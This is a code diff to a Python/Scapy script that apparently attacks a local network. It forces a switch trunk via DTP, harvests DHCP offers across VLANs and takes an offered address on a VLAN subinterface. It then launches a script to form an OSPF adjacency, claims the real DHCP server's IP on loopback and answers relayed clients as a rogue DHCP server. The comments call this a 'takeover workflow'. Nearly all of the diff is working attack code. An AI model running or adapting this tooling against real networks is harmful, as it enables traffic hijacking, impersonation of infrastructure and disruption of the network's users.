@@ -1,15 +1,19 @@
 import ipaddress
+from pathlib import Path
 import platform
 from queue import Queue
 import random
+import shlex
 import shutil
+import socket
 import subprocess
+import sys
 from threading import Event, Thread
 import time
 
 from scapy.all import (
     BOOTP,
-    DHCP,
+DHCP,
     Dot1Q,
     Dot3,
     Ether,
@@ -18,21 +22,28 @@ from scapy.all import (
     SNAP,
     STP,
     UDP,
+    get_if_addr,
     get_if_hwaddr,
     mac2str,
     sendp,
     sniff,
 )
 from scapy.contrib.dtp import DTP, DTPDomain, DTPStatus, DTPType
+from scapy.contrib.ospf import OSPF_Hdr
 
 DEFAULT_SUBNET_MASK = "255.255.255.0"
 DEFAULT_PREFIX_LENGTH = 24
 DEFAULT_DHCP_LEASE_TIME = 30 * 24 * 60 * 60
 MAX_DHCP_LEASE_TIME = 0xFFFFFFFF
 DEFAULT_DHCP_DISCOVER_VLANS = range(1, 30 + 1)
+DEFAULT_INTERFACE = "eth0"
 PVST_SNIFF_TIMEOUT = 10
 DTP_REFRESH_INTERVAL = 20
 DTP_REFRESH_REPEAT = 3
+INTERFACE_IPV4_WAIT_INTERVAL = 2
+INTERFACE_IPV4_WAIT_TIMEOUT = 60
+OSPF_FULL_WAIT_TIMEOUT = 300
+OSPF_SNIFF_FILTER = "ip proto 89 or (vlan and ip proto 89)"
 DHCP_SNIFF_FILTER = "udp and (port 67 or 68) or (vlan and udp and (port 67 or 68))"
 DHCP_DISCOVER_TYPES = {1, "discover"}
 DHCP_OFFER_TYPES = {2, "offer"}
@@ -286,6 +297,8 @@ def get_dhcp_lease_time():
 def get_requested_address(packet):
     """Return the requested DHCP address option as a string."""
     requested_address = get_dhcp_option(packet, "requested_addr")
+    if requested_address is None:
+        requested_address = get_dhcp_option(packet, "requested_ip_address")
     if requested_address is None:
         return None
 
@@ -544,8 +557,170 @@ def get_kali_ipv4_addresses(interface):
 
     print_step("OK", f"Found {len(addresses)} existing IPv4 address(es) on {interface}")
     return addresses
-   
-    
+
+
+def get_interface_ipv4_addresses(interface, scope="global"):
+    """Return current non-zero IPv4 addresses for an interface without noisy polling logs."""
+    if platform.system().lower() == "linux" and shutil.which("ip"):
+        command = ["ip", "-4", "-o", "addr", "show", "dev", interface]
+        if scope:
+            command.extend(["scope", scope])
+        result = subprocess.run(
+            command,
+            capture_output=True,
+            text=True,
+            check=False,
+        )
+        if result.returncode == 0:
+            addresses = []
+            for line in result.stdout.splitlines():
+                parts = line.split()
+                if "inet" in parts:
+                    inet_index = parts.index("inet")
+                    if inet_index + 1 < len(parts):
+                        addresses.append(parts[inet_index + 1])
+            return addresses
+
+    try:
+        address = get_if_addr(interface)
+    except Exception:
+        return []
+
+    if address and address != "0.0.0.0":
+        return [address]
+    return []
+
+
+def wait_for_interface_ipv4_address(interface, expected_address=None, timeout=INTERFACE_IPV4_WAIT_TIMEOUT):
+    """Wait until an interface has a usable IPv4 address, optionally a specific one."""
+    expected_message = f" {expected_address}" if expected_address else ""
+    print_step("START", f"Waiting for {interface} to have IPv4 address{expected_message}")
+    deadline = time.monotonic() + timeout if timeout is not None else None
+
+    while True:
+        addresses = get_interface_ipv4_addresses(interface)
+        plain_addresses = [address.split("/", 1)[0] for address in addresses]
+        if expected_address:
+            if expected_address in plain_addresses:
+                print_step("OK", f"{interface} has expected IPv4 address {expected_address}")
+                return addresses
+        elif addresses:
+            print_step("OK", f"{interface} has IPv4 address(es): {addresses}")
+            return addresses
+
+        if deadline is not None and time.monotonic() >= deadline:
+            waited_for = f" {timeout} seconds"
+            print_step("FAIL", f"Timed out after{waited_for} waiting for IPv4 address on {interface}")
+            raise TimeoutError(f"Timed out waiting for IPv4 address on {interface}")
+
+        time.sleep(INTERFACE_IPV4_WAIT_INTERVAL)
+
+
+def linux_interface_exists(interface):
+    """Return whether a Linux network interface exists."""
+    if platform.system().lower() != "linux" or not shutil.which("ip"):
+        return False
+    result = subprocess.run(
+        ["ip", "link", "show", "dev", interface],
+        capture_output=True,
+        text=True,
+        check=False,
+    )
+    return result.returncode == 0
+
+
+def build_vlan_subinterface_name(parent_interface, vlan_id):
+    """Return the Linux VLAN subinterface name for a parent interface and VLAN ID."""
+    return f"{parent_interface}.{int(vlan_id)}"
+
+
+def ensure_vlan_subinterface(parent_interface, vlan_id):
+    """Create and bring up a Linux VLAN subinterface when an offer came from a tagged VLAN."""
+    if vlan_id is None:
+        return parent_interface
+
+    vlan_id = int(vlan_id)
+    if not 1 <= vlan_id <= 4094:
+        raise ValueError(f"Invalid VLAN ID for subinterface creation: {vlan_id}")
+
+    system = platform.system().lower()
+    if system != "linux":
+        raise OSError("VLAN subinterface creation is only supported on Linux/Kali")
+    if not shutil.which("ip"):
+        raise FileNotFoundError("The Linux 'ip' command is required to create VLAN subinterfaces")
+
+    if parent_interface.endswith(f".{vlan_id}"):
+        subinterface = parent_interface
+    else:
+        subinterface = build_vlan_subinterface_name(parent_interface, vlan_id)
+
+    if linux_interface_exists(subinterface):
+        print_step("OK", f"VLAN subinterface {subinterface} already exists")
+    else:
+        run_command(
+            f"Creating VLAN {vlan_id} subinterface {subinterface} on {parent_interface}",
+            ["ip", "link", "add", "link", parent_interface, "name", subinterface, "type", "vlan", "id", str(vlan_id)],
+        )
+
+    run_command(
+        f"Bringing parent interface {parent_interface} up",
+        ["ip", "link", "set", parent_interface, "up"],
+    )
+    run_command(
+        f"Bringing VLAN subinterface {subinterface} up",
+        ["ip", "link", "set", subinterface, "up"],
+    )
+    return subinterface
+
+
+def add_loopback_ipv4_address(address, prefix_length=32):
+    """Add the DHCP server identity as a loopback IPv4 address on Linux."""
+    if platform.system().lower() != "linux":
+        raise OSError("Loopback DHCP server identity setup is only supported on Linux/Kali")
+    if not shutil.which("ip"):
+        raise FileNotFoundError("The Linux 'ip' command is required to add the loopback address")
+
+    ipaddress.IPv4Address(address)
+    existing_addresses = [
+        current_address.split("/", 1)[0]
+        for current_address in get_interface_ipv4_addresses("lo", scope=None)
+    ]
+    if address in existing_addresses:
+        print_step("OK", f"Loopback already has DHCP server identity {address}")
+    else:
+        run_command(
+            f"Adding DHCP server identity {address}/{prefix_length} to loopback",
+            ["ip", "addr", "add", f"{address}/{prefix_length}", "dev", "lo"],
+        )
+
+    run_command(
+        "Bringing loopback interface up",
+        ["ip", "link", "set", "lo", "up"],
+    )
+
+
+def wait_for_ospf_adjacency_exchange(interface, source_ip, timeout=OSPF_FULL_WAIT_TIMEOUT):
+    """Wait for OSPF LS exchange traffic from a neighbor on the wire."""
+    seen = []
+
+    def handle_packet(packet):
+        if packet.haslayer(OSPF_Hdr) and packet.haslayer(IP) and packet[IP].src != source_ip:
+            packet_type = int(packet[OSPF_Hdr].type)
+            if packet_type in {4, 5}:
+                seen.append(packet_type)
+                return True
+        return False
+
+    print_step("START", f"Waiting up to {timeout} seconds for OSPF adjacency exchange on {interface}")
+    sniff(iface=interface, filter=OSPF_SNIFF_FILTER, store=False, timeout=timeout, stop_filter=handle_packet)
+    if seen:
+        print_step("OK", f"Detected OSPF adjacency exchange packet type {seen[-1]} on {interface}")
+        return
+
+    print_step("FAIL", f"Timed out waiting for OSPF adjacency exchange on {interface}")
+    raise TimeoutError(f"Timed out waiting for OSPF adjacency exchange on {interface}")
+
+
 def remove_kali_ipv4_addresses(interface):
     """Remove every current IPv4 address from a Linux interface."""
     print_step("START", f"Removing existing IPv4 addresses from Linux interface {interface}")
@@ -621,36 +796,49 @@ def set_static_address(interface, address, netmask, gateway=None):
     print_step("OK", f"Static address setup finished on {interface}")
 
 
-def set_static_address_from_offer(interface, offer):
-    """Set this host's address to the DHCP server IP from one parsed DHCPOFFER."""
-    address = offer.get("dhcp_server_ip") or offer.get("server_id") or offer.get("src_ip")
-    netmask = offer.get("subnet_mask")
+def get_offered_client_ip(offer):
+    """Return the client IP offered by the upstream DHCP server."""
+    address = offer.get("offered_ip")
+    if not address or address == "0.0.0.0":
+        print_step("FAIL", "DHCPOFFER does not contain a usable offered client IP")
+        raise ValueError("DHCPOFFER does not contain a usable offered client IP")
+    ipaddress.IPv4Address(address)
+    return address
 
-    print_step("START", f"Preparing fallback DHCP server address from offer: {offer}")
+
+def get_original_dhcp_server_ip(offer):
+    """Return the original DHCP server identity from one parsed DHCPOFFER."""
+    address = offer.get("dhcp_server_ip") or offer.get("server_id") or offer.get("src_ip")
     if not address or address == "0.0.0.0":
         print_step("FAIL", "DHCPOFFER does not contain a usable DHCP server IP")
         raise ValueError("DHCPOFFER does not contain a usable DHCP server IP")
+    ipaddress.IPv4Address(address)
+    return address
+
+
+def set_static_address_from_offer(interface, offer):
+    """Set this host's VLAN interface to the client IP from one parsed DHCPOFFER."""
+    address = get_offered_client_ip(offer)
+    netmask = offer.get("subnet_mask")
+
+    print_step("START", f"Preparing offered VLAN interface address from offer: {offer}")
     if not netmask:
         print_step("FAIL", "DHCPOFFER does not contain a subnet mask")
         raise ValueError("DHCPOFFER does not contain a subnet mask")
 
-    # Use the DHCP server IP, not the offered client IP, because this host is taking
-    # over as the fallback DHCP server.
-    print_step("OK", f"Selected DHCP server IP {address} as this host's static address")
+    print_step("OK", f"Selected offered client IP {address} as this host's VLAN interface address")
     set_static_address(interface, address, netmask)
+    return address
 
 
 def build_server_details_from_offer(interface, offer, offers=None):
     """Build DHCP server settings from the selected upstream DHCPOFFER."""
-    server_ip = offer.get("dhcp_server_ip") or offer.get("server_id") or offer.get("src_ip")
+    server_ip = get_original_dhcp_server_ip(offer)
     netmask = offer.get("subnet_mask")
     gateway = get_first_ipv4_address(offer.get("router"))
     vlan_details = build_vlan_details_from_offers(offers or [offer])
 
     print_step("START", f"Building fallback DHCP server details from offer: {offer}")
-    if not server_ip or server_ip == "0.0.0.0":
-        print_step("FAIL", "Selected offer does not contain a usable DHCP server IP")
-        raise ValueError("Selected offer does not contain a usable DHCP server IP")
     if not netmask:
         print_step("FAIL", "Selected offer does not contain a subnet mask")
         raise ValueError("Selected offer does not contain a subnet mask")
@@ -662,6 +850,7 @@ def build_server_details_from_offer(interface, offer, offers=None):
         "netmask": netmask,
         "network": ipaddress.IPv4Network(f"{server_ip}/{netmask}", strict=False),
         "vlan_details": vlan_details,
+        "relay_only": True,
     }
     print_step("OK", f"Fallback DHCP server details: {details}")
     return details
@@ -688,6 +877,15 @@ def get_client_key(packet):
         client_id = str(chaddr)
 
     return (bootp.xid, client_id)
+
+
+def get_proposed_lease_key(packet, dhcp_network):
+    """Return a lease key that separates direct and relayed DHCP state."""
+    bootp = packet[BOOTP]
+    xid, client_id = get_client_key(packet)
+    if bootp.giaddr == "0.0.0.0":
+        return (xid, client_id, "direct", str(dhcp_network["network"]))
+    return (xid, client_id, "relay", str(dhcp_network["network"]))
 
 
 def get_bootp_client_mac(packet):
@@ -829,6 +1027,12 @@ def get_or_add_dhcp_network(packet, networks, server_details):
 
     for dhcp_network in networks:
         if dhcp_network["key"] == network_key:
+            if mode == "relay":
+                dhcp_network["giaddr"] = giaddr
+                dhcp_network["relay_agent_ip"] = relay_agent_ip
+                dhcp_network["excluded_addresses"].add(giaddr)
+                if router:
+                    dhcp_network["excluded_addresses"].add(router)
             if vlan_id is not None and dhcp_network.get("vlan_id") != vlan_id:
                 print_step(
                     "OK",
@@ -987,8 +1191,8 @@ def offer_address_to_discover(packet, networks, proposed_leases, server_details)
     print_step("START", f"Processing DHCPDISCOVER xid={packet[BOOTP].xid} giaddr={giaddr}")
     dhcp_network = get_or_add_dhcp_network(packet, networks, server_details)
 
-    client_key = get_client_key(packet)
-    existing_offer = proposed_leases.get(client_key)
+    lease_key = get_proposed_lease_key(packet, dhcp_network)
+    existing_offer = proposed_leases.get(lease_key)
     requested_address = get_requested_address(packet)
     offered_ip = (
         existing_offer["ip_address"]
@@ -999,10 +1203,9 @@ def offer_address_to_discover(packet, networks, proposed_leases, server_details)
         return None
 
     server_ip = server_details["source_ip"]
-    proposed_leases[client_key] = {
+    proposed_leases[lease_key] = {
         "ip_address": offered_ip,
-        "giaddr": dhcp_network["giaddr"],
-        "dhcp_network": dhcp_network,
+        "key": lease_key,
     }
 
     offer_packet = build_dhcp_response(
@@ -1034,8 +1237,9 @@ def ack_request(packet, networks, proposed_leases, server_details):
         return None
 
     print_step("START", f"Processing DHCPREQUEST xid={packet[BOOTP].xid} giaddr={packet[BOOTP].giaddr}")
-    client_key = get_client_key(packet)
-    proposed_lease = proposed_leases.get(client_key)
+    dhcp_network = get_or_add_dhcp_network(packet, networks, server_details)
+    lease_key = get_proposed_lease_key(packet, dhcp_network)
+    proposed_lease = proposed_leases.get(lease_key)
     if proposed_lease is None:
         print_step("FAIL", "Ignoring DHCPREQUEST with no matching proposed lease")
         return None
@@ -1046,7 +1250,6 @@ def ack_request(packet, networks, proposed_leases, server_details):
         print_step("FAIL", f"Ignoring DHCPREQUEST for {requested_ip}; proposed {offered_ip}")
         return None
 
-    dhcp_network = proposed_lease["dhcp_network"]
     server_ip = server_details["source_ip"]
     ack_packet = build_dhcp_response(
         packet,
@@ -1066,13 +1269,17 @@ def ack_request(packet, networks, proposed_leases, server_details):
 
     dhcp_network["proposed_addresses"].discard(offered_ip)
     dhcp_network["leased_addresses"].add(offered_ip)
-    del proposed_leases[client_key]
+    del proposed_leases[lease_key]
     print_step("OK", f"Recorded DHCP lease {offered_ip}")
     return offered_ip
 
 
 def handle_dhcp_client_packet(packet, networks, proposed_leases, server_details):
     """Handle DHCPDISCOVER or DHCPREQUEST and return a result dictionary."""
+    if server_details.get("relay_only") and packet[BOOTP].giaddr == "0.0.0.0":
+        print_step("SKIP", "Ignoring direct DHCP packet in routed-helper workflow")
+        return None
+
     message_type = get_dhcp_message_type(packet)
     if message_type in DHCP_DISCOVER_TYPES:
         offered_ip = offer_address_to_discover(packet, networks, proposed_leases, server_details)
@@ -1101,6 +1308,19 @@ def handle_dhcp_client_packet(packet, networks, proposed_leases, server_details)
     return None
 
 
+def bind_dhcp_udp_guard(address="0.0.0.0"):
+    """Bind UDP/67 so Linux does not emit ICMP port-unreachable while Scapy sniffs."""
+    guard_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    guard_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    try:
+        guard_socket.bind((address, 67))
+    except OSError:
+        guard_socket.close()
+        raise
+    print_step("OK", f"Bound UDP/67 guard socket on {address}")
+    return guard_socket
+
+
 def sniff_for_dhcp_discover_and_request(networks, proposed_leases, server_details, timeout=None, count=0):
     """Sniff for DHCPDISCOVER/DHCPREQUEST packets, respond, and return handled events."""
     handled_events = []
@@ -1112,15 +1332,19 @@ def sniff_for_dhcp_discover_and_request(networks, proposed_leases, server_detail
             print_step("OK", f"Handled DHCP {result['message_type']} with {result['action']} {result['ip_address']}")
 
     print_step("START", f"Sniffing DHCPDISCOVER/DHCPREQUEST packets on {server_details['interface']}")
-    sniff(
-        iface=server_details["interface"],
-        filter=DHCP_SNIFF_FILTER,
-        lfilter=lambda packet: packet.haslayer(DHCP) and packet.haslayer(BOOTP),
-        prn=handle_packet,
-        store=False,
-        timeout=timeout,
-        count=count,
-    )
+    guard_socket = bind_dhcp_udp_guard()
+    try:
+        sniff(
+            iface=server_details["interface"],
+            filter=DHCP_SNIFF_FILTER,
+            lfilter=lambda packet: packet.haslayer(DHCP) and packet.haslayer(BOOTP),
+            prn=handle_packet,
+            store=False,
+            timeout=timeout,
+            count=count,
+        )
+    finally:
+        guard_socket.close()
     print_step("OK", f"Finished DHCP client sniff loop with {len(handled_events)} handled event(s)")
     return handled_events
 
@@ -1128,10 +1352,57 @@ def sniff_for_dhcp_discover_and_request(networks, proposed_leases, server_detail
 def sniff_worker(interface, result_queue):
     offers = sniff_DHCPOffer_packets(interface, timeout=30)
     result_queue.put(offers)
-    
+
+
+def run_ospf_full_adjacency(interface, vlan_id=None):
+    """Open the OSPF adjacency script in a new Kali/Linux terminal."""
+    ospf_script = Path(__file__).resolve().parent.parent / "OSPF" / "ospf_full_adjacency.py"
+    if not ospf_script.exists():
+        raise FileNotFoundError(f"OSPF adjacency script not found: {ospf_script}")
+
+    ospf_command = [sys.executable, str(ospf_script), "--iface", interface]
+    if vlan_id is not None:
+        ospf_command.extend(["--vlan", str(vlan_id)])
+
+    if platform.system().lower() != "linux":
+        print_step("START", f"Launching OSPF full adjacency script on {interface}")
+        subprocess.run(ospf_command, check=True)
+        return
+
+    shell_command = " ".join(shlex.quote(str(part)) for part in ospf_command)
+    terminal_shell_command = (
+        f"{shell_command}; "
+        "exit_code=$?; "
+        "echo; "
+        "echo \"OSPF adjacency script exited with status ${exit_code}.\"; "
+        "read -r -p \"Press Enter to close this terminal...\"; "
+        "exit ${exit_code}"
+    )
+    terminal_options = [
+        ("x-terminal-emulator", ["-e", "bash", "-lc", terminal_shell_command]),
+        ("qterminal", ["-e", "bash", "-lc", terminal_shell_command]),
+        ("xfce4-terminal", ["--hold", "--command", f"bash -lc {shlex.quote(terminal_shell_command)}"]),
+        ("gnome-terminal", ["--", "bash", "-lc", terminal_shell_command]),
+        ("konsole", ["--noclose", "-e", "bash", "-lc", terminal_shell_command]),
+        ("xterm", ["-hold", "-e", "bash", "-lc", terminal_shell_command]),
+    ]
+
+    for terminal_name, terminal_args in terminal_options:
+        terminal_path = shutil.which(terminal_name)
+        if terminal_path:
+            print_step("START", f"Opening OSPF full adjacency script in a new terminal on {interface}")
+            subprocess.Popen([terminal_path, *terminal_args])
+            print_step("OK", f"OSPF full adjacency terminal launched with {terminal_name}")
+            return
+
+    raise RuntimeError(
+        "No supported Linux terminal emulator found. Install x-terminal-emulator, "
+        "qterminal, xfce4-terminal, gnome-terminal, konsole, or xterm."
+    )
+
 
 def main():
-    interface = "eth0"  # change this
+    interface = DEFAULT_INTERFACE  # change this
 
     # Force the Trunk!!!
     force_trunk(interface)
@@ -1178,13 +1449,21 @@ def main():
             return
 
         selected_offer = offers[0]
-        print_step("START", f"Using first DHCPOFFER result to take DHCP server IP: {selected_offer}")
-        set_static_address_from_offer(interface, selected_offer)
-        print_step("OK", "Static address was set to the DHCP server IP from the selected DHCPOFFER")
+        selected_vlan_id = selected_offer.get("vlan")
+        original_dhcp_server_ip = get_original_dhcp_server_ip(selected_offer)
+        print_step("START", f"Using first DHCPOFFER result for OSPF/DHCP takeover workflow: {selected_offer}")
+        ospf_interface = ensure_vlan_subinterface(interface, selected_vlan_id)
+        selected_address = set_static_address_from_offer(ospf_interface, selected_offer)
+        wait_for_interface_ipv4_address(ospf_interface, expected_address=selected_address)
+        print_step("OK", "Offered client IP was set on the OSPF interface from the selected DHCPOFFER")
+
+        run_ospf_full_adjacency(ospf_interface, vlan_id=selected_vlan_id)
+        wait_for_ospf_adjacency_exchange(ospf_interface, selected_address)
+        add_loopback_ipv4_address(original_dhcp_server_ip)
 
         networks = []
         proposed_leases = {}
-        server_details = build_server_details_from_offer(interface, selected_offer, offers)
+        server_details = build_server_details_from_offer(ospf_interface, selected_offer, offers)
         print_step("START", "Starting fallback DHCP server DISCOVER/REQUEST handler")
         handled_events = sniff_for_dhcp_discover_and_request(
             networks,
